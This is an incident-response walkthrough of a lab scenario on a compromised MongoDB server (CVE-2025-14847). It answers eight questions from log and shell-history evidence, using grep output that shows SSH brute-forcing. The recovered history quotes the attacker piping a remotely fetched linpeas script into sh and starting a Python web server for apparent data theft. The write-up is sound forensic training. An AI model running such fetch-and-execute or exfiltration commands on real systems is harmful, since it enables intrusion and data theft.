# MangoBleed

**1. What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?**\
Ans: CVE-2025-14847

---

**2. What is the version of MongoDB installed on the server that the CVE exploited?**\
Ans: 8.0.16

Solution:

```bash
┌──(kali㉿kali)-[~/…/[root]/var/log/mongodb]
└─$ cat mongod.log | grep "version"           
{"t":{"$date":"2025-12-29T05:11:47.713+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T05:11:47.713+00:00"},"s":"I",  "c":"CONTROL",  "id":51765,   "ctx":"initandlisten","msg":"Operating System","attr":{"os":{"name":"Ubuntu","version":"24.04"}}}
{"t":{"$date":"2025-12-29T05:11:48.489+00:00"},"s":"I",  "c":"STORAGE",  "id":20320,   "ctx":"initandlisten","msg":"createCollection","attr":{"namespace":"admin.system.version","uuidDisposition":"provided","uuid":{"uuid":{"$uuid":"1cb5b979-f4f8-4899-b083-cb7493c90db8"}},"options":{"uuid":{"$uuid":"1cb5b979-f4f8-4899-b083-cb7493c90db8"}}}}
{"t":{"$date":"2025-12-29T05:11:48.504+00:00"},"s":"I",  "c":"INDEX",    "id":20345,   "ctx":"initandlisten","msg":"Index build: done building","attr":{"buildUUID":null,"collectionUUID":{"uuid":{"$uuid":"1cb5b979-f4f8-4899-b083-cb7493c90db8"}},"namespace":"admin.system.version","index":"_id_","ident":"index-1-914848041129764209","collectionIdent":"collection-0-914848041129764209","commitTimestamp":null}}
{"t":{"$date":"2025-12-29T05:16:58.104+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T05:16:58.104+00:00"},"s":"I",  "c":"CONTROL",  "id":51765,   "ctx":"initandlisten","msg":"Operating System","attr":{"os":{"name":"Ubuntu","version":"24.04"}}}
{"t":{"$date":"2025-12-29T06:09:34.806+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T06:09:34.806+00:00"},"s":"I",  "c":"CONTROL",  "id":51765,   "ctx":"initandlisten","msg":"Operating System","attr":{"os":{"name":"Ubuntu","version":"24.04"}}}
```

---

**3. Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.**\
Ans: 65.0.76.43

Solution:

```bash
┌──(kali㉿kali)-[~/…/[root]/var/log/mongodb]
└─$ cat mongod.log | grep "connection"
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":1}}
```

---

**4. Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)**\
Ans: 2025-12-29 05:25:52

Solution:

```bash
┌──(kali㉿kali)-[~/…/[root]/var/log/mongodb]
└─$ cat mongod.log | grep "65.0.76.43" > log
```

Read the first line of the log.

---

**5. Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.**\
Ans: 75260

Solution:

```bash
┌──(kali㉿kali)-[~/…/[root]/var/log/mongodb]
└─$ cat mongod.log | grep "65.0.76.43" | wc -l     
75260
```

---

**6. The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?**\
Ans: 2025-12-29 05:40:03

```bash
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/var/log]
└─$ cat auth.log | grep "keyboard"
2025-12-29T05:04:11.116372+00:00 ip-172-31-38-170 systemd-logind[678]: Watching system buttons on /dev/input/event2 (AT Translated Set 2 keyboard)
2025-12-29T05:39:24.276756+00:00 ip-172-31-38-170 sshd[39825]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T06:00:31.171853+00:00 ip-172-31-38-170 sshd[70457]: Accepted keyboard-interactive/pam for root from 119.73.124.129 port 24837 ssh2
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/var/log]
└─$ cat auth.log | grep "39825"   
2025-12-29T05:39:21.879041+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.088863+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.276756+00:00 ip-172-31-38-170 sshd[39825]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2
2025-12-29T05:39:24.280444+00:00 ip-172-31-38-170 sshd[39825]: pam_unix(sshd:session): session opened for user mongoadmin(uid=1001) by mongoadmin(uid=0)
2025-12-29T05:39:24.861336+00:00 ip-172-31-38-170 sshd[39825]: pam_unix(sshd:session): session closed for user mongoadmin
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/var/log]
└─$ cat auth.log | grep "65.0.76.43"
2025-12-29T05:39:18.864074+00:00 ip-172-31-38-170 sshd[39814]: Received disconnect from 65.0.76.43 port 54962:11: Bye Bye [preauth]
2025-12-29T05:39:18.866641+00:00 ip-172-31-38-170 sshd[39814]: Disconnected from authenticating user mongoadmin 65.0.76.43 port 54962 [preauth]
2025-12-29T05:39:19.113009+00:00 ip-172-31-38-170 sshd[2152]: drop connection #10 from [65.0.76.43]:55068 on [172.31.38.170]:22 past MaxStartups
2025-12-29T05:39:19.381375+00:00 ip-172-31-38-170 sshd[39844]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.478221+00:00 ip-172-31-38-170 sshd[39845]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.545976+00:00 ip-172-31-38-170 sshd[39846]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.554759+00:00 ip-172-31-38-170 sshd[39847]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.554993+00:00 ip-172-31-38-170 sshd[39848]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.555198+00:00 ip-172-31-38-170 sshd[39851]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.558909+00:00 ip-172-31-38-170 sshd[39854]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.564686+00:00 ip-172-31-38-170 sshd[39853]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.564934+00:00 ip-172-31-38-170 sshd[39855]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.565129+00:00 ip-172-31-38-170 sshd[39850]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.566958+00:00 ip-172-31-38-170 sshd[39856]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.567215+00:00 ip-172-31-38-170 sshd[39852]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.567871+00:00 ip-172-31-38-170 sshd[39849]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.572079+00:00 ip-172-31-38-170 sshd[39857]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:21.697983+00:00 ip-172-31-38-170 sshd[39816]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.752018+00:00 ip-172-31-38-170 sshd[39858]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:21.797661+00:00 ip-172-31-38-170 sshd[39818]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.851009+00:00 ip-172-31-38-170 sshd[39859]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:21.856191+00:00 ip-172-31-38-170 sshd[39819]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.870123+00:00 ip-172-31-38-170 sshd[39820]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.871087+00:00 ip-172-31-38-170 sshd[39824]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.871332+00:00 ip-172-31-38-170 sshd[39821]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.878545+00:00 ip-172-31-38-170 sshd[39823]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.879041+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.880199+00:00 ip-172-31-38-170 sshd[39827]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.880996+00:00 ip-172-31-38-170 sshd[39817]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.883517+00:00 ip-172-31-38-170 sshd[39830]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.883794+00:00 ip-172-31-38-170 sshd[39826]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.884016+00:00 ip-172-31-38-170 sshd[39822]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.890635+00:00 ip-172-31-38-170 sshd[39829]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:22.030041+00:00 ip-172-31-38-170 sshd[39860]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.146020+00:00 ip-172-31-38-170 sshd[39861]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.158046+00:00 ip-172-31-38-170 sshd[39871]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.161929+00:00 ip-172-31-38-170 sshd[39862]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.162153+00:00 ip-172-31-38-170 sshd[39869]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.162355+00:00 ip-172-31-38-170 sshd[39863]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.166407+00:00 ip-172-31-38-170 sshd[39865]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.166627+00:00 ip-172-31-38-170 sshd[39867]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.166873+00:00 ip-172-31-38-170 sshd[39866]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.167075+00:00 ip-172-31-38-170 sshd[39864]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.167285+00:00 ip-172-31-38-170 sshd[39868]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.173507+00:00 ip-172-31-38-170 sshd[39870]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:23.676920+00:00 ip-172-31-38-170 sshd[39816]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:23.731304+00:00 ip-172-31-38-170 sshd[39872]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:23.776120+00:00 ip-172-31-38-170 sshd[39818]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:23.829259+00:00 ip-172-31-38-170 sshd[39873]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:23.951868+00:00 ip-172-31-38-170 sshd[39819]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.005606+00:00 ip-172-31-38-170 sshd[39874]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.067192+00:00 ip-172-31-38-170 sshd[39824]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.081971+00:00 ip-172-31-38-170 sshd[39822]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.085379+00:00 ip-172-31-38-170 sshd[39821]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.086370+00:00 ip-172-31-38-170 sshd[39820]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.088632+00:00 ip-172-31-38-170 sshd[39817]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.088863+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.091298+00:00 ip-172-31-38-170 sshd[39829]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.092043+00:00 ip-172-31-38-170 sshd[39826]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.092755+00:00 ip-172-31-38-170 sshd[39823]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.097350+00:00 ip-172-31-38-170 sshd[39830]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.099331+00:00 ip-172-31-38-170 sshd[39827]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.108758+00:00 ip-172-31-38-170 sshd[39830]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55126 [preauth]
2025-12-29T05:39:24.108846+00:00 ip-172-31-38-170 sshd[39827]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55096 [preauth]
2025-12-29T05:39:24.108889+00:00 ip-172-31-38-170 sshd[39826]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55090 [preauth]
2025-12-29T05:39:24.210906+00:00 ip-172-31-38-170 sshd[39875]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.269457+00:00 ip-172-31-38-170 sshd[39878]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.273306+00:00 ip-172-31-38-170 sshd[39876]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.276756+00:00 ip-172-31-38-170 sshd[39825]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2
2025-12-29T05:39:24.279681+00:00 ip-172-31-38-170 sshd[39882]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.286885+00:00 ip-172-31-38-170 sshd[39879]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.289290+00:00 ip-172-31-38-170 sshd[39881]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.289574+00:00 ip-172-31-38-170 sshd[39880]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:25.596404+00:00 ip-172-31-38-170 sshd[39816]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.598101+00:00 ip-172-31-38-170 sshd[39816]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 54976 [preauth]
2025-12-29T05:39:25.694370+00:00 ip-172-31-38-170 sshd[39818]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.695961+00:00 ip-172-31-38-170 sshd[39818]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 54988 [preauth]
2025-12-29T05:39:25.870560+00:00 ip-172-31-38-170 sshd[39819]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.872303+00:00 ip-172-31-38-170 sshd[39819]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55002 [preauth]
2025-12-29T05:39:25.880047+00:00 ip-172-31-38-170 sshd[39824]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.881891+00:00 ip-172-31-38-170 sshd[39824]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55040 [preauth]
2025-12-29T05:39:25.938496+00:00 ip-172-31-38-170 sshd[39829]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.940446+00:00 ip-172-31-38-170 sshd[39829]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55112 [preauth]
2025-12-29T05:39:25.941340+00:00 ip-172-31-38-170 sshd[39822]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.943193+00:00 ip-172-31-38-170 sshd[39822]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55018 [preauth]
2025-12-29T05:39:25.949031+00:00 ip-172-31-38-170 sshd[39823]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.950631+00:00 ip-172-31-38-170 sshd[39823]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55034 [preauth]
2025-12-29T05:39:25.955047+00:00 ip-172-31-38-170 sshd[39817]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.958028+00:00 ip-172-31-38-170 sshd[39820]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.959241+00:00 ip-172-31-38-170 sshd[39821]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.959329+00:00 ip-172-31-38-170 sshd[39817]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 54978 [preauth]
2025-12-29T05:39:25.959975+00:00 ip-172-31-38-170 sshd[39820]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55006 [preauth]
2025-12-29T05:39:25.960736+00:00 ip-172-31-38-170 sshd[39821]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55014 [preauth]
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T05:48:28.249844+00:00 ip-172-31-38-170 sshd[40027]: Received disconnect from 65.0.76.43 port 46062:11: disconnected by user
2025-12-29T05:48:28.250045+00:00 ip-172-31-38-170 sshd[40027]: Disconnected from user mongoadmin 65.0.76.43 port 46062
```

---

**7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.**\
Ans: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

Solution:

```bash
┌──(kali㉿kali)-[~/htb/sherlocks/mangobleed/uac-mongodbsync-linux-triage]
└─$ cd [root]/home/mongoadmin
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/home/mongoadmin]
└─$ ls    
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/home/mongoadmin]
└─$ ls -la
total 28
drwxrwxr-x 2 kali kali 4096 Dec 29  2025 .
drwxrwxr-x 4 kali kali 4096 Dec 29  2025 ..
-rw-rw-r-- 1 kali kali  250 Dec 29  2025 .bash_history
-rw-rw-r-- 1 kali kali  220 Dec 29  2025 .bash_logout
-rw-rw-r-- 1 kali kali 3771 Dec 29  2025 .bashrc
-rw-rw-r-- 1 kali kali  807 Dec 29  2025 .profile
-rw-rw-r-- 1 kali kali    7 Dec 29  2025 .python_history
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/home/mongoadmin]
└─$ cat .bash_history 
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```

---

**8. The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?**\
Ans: /var/lib/mongodb

Solution:

```bash
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/home/mongoadmin]
└─$ cat .bash_history 
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/   <-- the target
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```
